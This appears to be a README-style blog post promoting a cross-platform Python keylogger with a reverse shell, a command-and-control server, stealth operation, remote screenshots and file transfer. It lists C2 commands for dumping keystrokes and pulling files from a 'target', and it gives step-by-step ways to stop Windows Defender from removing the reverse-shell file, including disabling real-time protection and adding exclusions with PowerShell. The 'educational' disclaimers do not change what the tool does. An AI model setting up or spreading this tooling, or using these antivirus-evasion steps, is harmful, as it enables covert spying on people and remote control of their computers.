[My Python Keylogger project — more than just keystroke capture](https://dev.to/bolewara/my-python-keylogger-project-more-than-just-keystroke-capture-lpk)
```0
A Python keylogger I built that also works as a reverse shell. Captures keystrokes, transfers files, and takes screenshots remotely. Works on Windows, Linux, and Mac. Made this for learning cybersecurity .

[![Python Version](https://img.shields.io/badge/python-3.8%2B-blue.svg)](https://python.org)
[![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20Linux%20%7C%20macOS-lightgrey.svg)](https://github.com/anujbolewar/KeyLogger)

---
## Features

- Cross-platform support (Windows, Linux, macOS)
- Keystroke logging with intelligent filtering
- Reverse shell capabilities
- Stealth operation
- Configurable settings
- Multi-threaded operation
- Real-time monitoring


##  Installation

### Prerequisites

- **Python 3.8+** installed on your system
- **pip** package manager
- **Administrative privileges** (for certain features)

### Quick Setup

1. **Clone the repository**:
   ```bash
   git clone https://github.com/anujbolewar/KeyLogger.git
   cd KeyLogger
   ```

2. **Install dependencies**:
   ```bash
   pip install -r requirements.txt
   ```

3. **Configure environment variables**:
   ```bash
   cp .env.example .env
   # Edit .env with your preferred settings
   ```

### Platform-Specific Setup

#### Windows
```bash
# Run as Administrator for full functionality
pip install pynput mss requests python-dotenv
```

#### Linux/Ubuntu
```bash
sudo apt update
sudo apt install python3-pip python3-dev
pip3 install -r requirements.txt
```

#### macOS
```bash
# Grant accessibility permissions in System Preferences
pip3 install -r requirements.txt
```

---

## Usage Examples

### Basic Keylogger Operation

```python
#!/usr/bin/env python3
import keylogger

# Start keylogger (educational testing only)
keylogger.start()
```

### Server Setup (Listener)

```bash
# Terminal 1: Start the server
python3 server.py

# Output:
# [+] Listening For Incoming Connections on 127.0.0.1:54321...
# [+] Target Connected From: ('192.168.1.100', 45678)
```

### Client Connection (Target)

```bash
# Terminal 2: Connect client to server
python3 reverse_shell.py

# Output:
# [*] Attempting to connect to 127.0.0.1:54321
# [+] Successfully connected to 127.0.0.1:54321
```

### Available Commands

Once connected, use these commands in the server terminal:

```bash
* Shell#~192.168.1.100: help                # Show all available commands
* Shell#~192.168.1.100: keylog_start        # Begin keystroke logging
* Shell#~192.168.1.100: keylog_dump         # Display captured keystrokes
* Shell#~192.168.1.100: screenshot          # Capture screen
* Shell#~192.168.1.100: download file.txt   # Download file from target
* Shell#~192.168.1.100: upload file.txt     # Upload file to target
* Shell#~192.168.1.100: check               # Check admin privileges
* Shell#~192.168.1.100: q                   # Quit session
```

### Configuration Options

Edit `.env` file for custom settings:

```env
# Server Configuration
SERVER_HOST=0.0.0.0          # Bind to all interfaces
SERVER_PORT=54321            # Custom port

# Connection Settings  
MAX_CONNECTIONS=5            # Maximum concurrent connections

# File Settings
SCREENSHOT_PREFIX=screenshot # Screenshot filename prefix
```

---

## **Live Demonstration**

Here's the KeyLogger in action, showing real captured data and successful server-client connections:

### Keystroke Capture Output
![Keylogger Output](media/Screenshot%20from%202025-09-22%2022-44-19.png)
*The keylogger successfully captures keystrokes including special keys like Ctrl, Alt, Backspace, and Enter. The output shows real-time logging with proper formatting.*

### Server-Client Connection
![Server Connection](media/Screenshot%20from%202025-09-22%2022-44-36.png)
*Demonstration of the reverse shell connection between server and client, showing successful connection establishment and command execution capabilities.*

> **Note**: These screenshots demonstrate the tool working in a controlled testing environment for educational purposes only.

---

##  Project Structure

```
KeyLogger/
├── keylogger.py          # Core keylogging functionality
├── server.py             # Command & control server
├── reverse_shell.py      # Client connection handler
├── test_client.py        # Testing utilities
├── requirements.txt      # Python dependencies
├── .env.example         # Configuration template
├── README.md            # Documentation
├── __pycache__/         # Python cache files
├── media/               # Screenshots and documentation images
│   ├── KeyLogger.mp4
│   ├── Screenshot from 2025-09-22 22-44-19.png
│   └── Screenshot from 2025-09-22 22-44-36.png
└── screnshot/           # Additional screenshot storage
    ├── 1.png
    └── 2.png
```

### Component Overview

| File | Purpose |
|------|---------|
| `keylogger.py` | Cross-platform keystroke capture and logging |
| `server.py` | Command and control interface for remote management |
| `reverse_shell.py` | Client-side connection and command execution |
| `test_client.py` | Development testing and validation tools |

---

##  Contributing

We welcome contributions from the cybersecurity and educational community! Here's how you can help:

### How to Contribute

1. **Fork the repository**
2. **Create a feature branch**: `git checkout -b feature/amazing-feature`
3. **Make your changes** with proper documentation
4. **Test thoroughly** in a controlled environment
5. **Commit your changes**: `git commit -m 'Add amazing feature'`
6. **Push to branch**: `git push origin feature/amazing-feature`
7. **Open a Pull Request** with detailed description

### Contribution Guidelines

- **Educational Focus**: Ensure all contributions maintain educational value
- **Code Quality**: Follow PEP 8 style guidelines
- **Documentation**: Include clear docstrings and comments
- **Testing**: Test on multiple platforms when possible
- **Ethical Standards**: All contributions must emphasize ethical usage

### Code Style

```python
# Example of preferred code style
def process_keystrokes(key_input):
    """
    Process captured keystrokes with proper error handling.
    
    Args:
        key_input: Raw keyboard input from pynput
        
    Returns:
        str: Formatted keystroke string
    """
    try:
        return str(key_input.char)
    except AttributeError:
        return handle_special_keys(key_input)
```

### Issue Reporting

When reporting issues, please include:
- **Operating System** and version
- **Python version**
- **Error messages** (full traceback)
- **Steps to reproduce**
- **Expected vs actual behavior**

### Contact for Collaboration

- **GitHub Issues**: For bug reports and feature requests
- **Email**: For security-related concerns or private discussions
- **Discussions**: Use GitHub Discussions for questions and ideas

---

##  Troubleshooting

### Common Issues

#### Permission Errors
```bash
# Linux/macOS: Grant accessibility permissions
sudo python3 keylogger.py

# Windows: Run as Administrator
Right-click → "Run as administrator"
```

#### Connection Issues
```bash
# Check firewall settings
sudo ufw allow 54321/tcp  # Linux
netsh advfirewall firewall add rule name="KeyLogger" dir=in action=allow protocol=TCP localport=54321  # Windows
```

#### Module Import Errors
```bash
# Reinstall dependencies
pip3 install --upgrade -r requirements.txt

# Virtual environment (recommended)
python3 -m venv venv
source venv/bin/activate  # Linux/macOS
venv\Scripts\activate     # Windows
pip install -r requirements.txt
```

### Platform-Specific Notes

#### Windows
- Requires administrative privileges for some features
- **Windows Defender will delete `reverse_shell.py`** upon cloning due to security detection
- Grant accessibility permissions in Windows Security

##### Windows Defender Solution
Windows Defender automatically removes `reverse_shell.py` because it detects reverse shell patterns. Here are solutions:

**Option 1: Disable Real-time Protection Temporarily**
```bash
# 1. Open Windows Security → Virus & threat protection
# 2. Turn off "Real-time protection" temporarily
# 3. Clone the repository
# 4. Add the project folder to exclusions
# 5. Re-enable real-time protection
```

**Option 2: Add Exclusion Before Cloning**
```bash
# 1. Open Windows Security → Virus & threat protection
# 2. Go to "Manage settings" under Virus & threat protection settings
# 3. Add an exclusion for your project directory
# 4. Clone the repository to that directory
```

**Option 3: Use PowerShell/Terminal Method**
```powershell
# Add exclusion via PowerShell (run as Administrator)
Add-MpPreference -ExclusionPath "C:\path\to\your\KeyLogger\folder"

# Then clone the repository
git clone https://github.com/anujbolewar/KeyLogger.git
```

> **Note**: Only disable security features in controlled environments for educational purposes. Always re-enable protection after testing.

#### Linux
- May require X11 forwarding for GUI features
- Some distributions need additional packages: `sudo apt install python3-tk`

#### macOS
- Grant accessibility permissions in System Preferences → Security & Privacy
- May require disabling System Integrity Protection for advanced features

---
### Copyright

Copyright © 2025 Anuj Bolewar. All rights reserved.

##  Author Information

**Anuj Bolewar**
- **GitHub**: [@anujbolewar](https://github.com/anujbolewar)
- **Project Repository**: [KeyLogger](https://github.com/anujbolewar/KeyLogger)

### Professional Background
Cybersecurity enthusiast and developer focused on educational security tools and ethical hacking methodologies. Passionate about helping others learn cybersecurity through hands-on, practical examples.



## Acknowledgments

- **pynput** developers for cross-platform input monitoring
- **mss** team for efficient screenshot capabilities  
- **Python community** for excellent documentation and support
- **Cybersecurity educators** who emphasize ethical hacking practices
- **Open source contributors** who make learning accessible

### Educational Resources

For those interested in learning more about cybersecurity:
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework)
- [Ethical Hacking Courses](https://www.coursera.org/browse/information-technology/security)

---

##  Support

If you find this project helpful for your cybersecurity education, please:
-  **Star this repository**
-  **Fork it** for your own experiments
-  **Share it** with fellow security enthusiasts
-  **Contribute** improvements and features

**Remember**: Knowledge is powerful. Use it responsibly. 

---

*This README was crafted with ❤️ for the cybersecurity education community. Happy (ethical) hacking!*
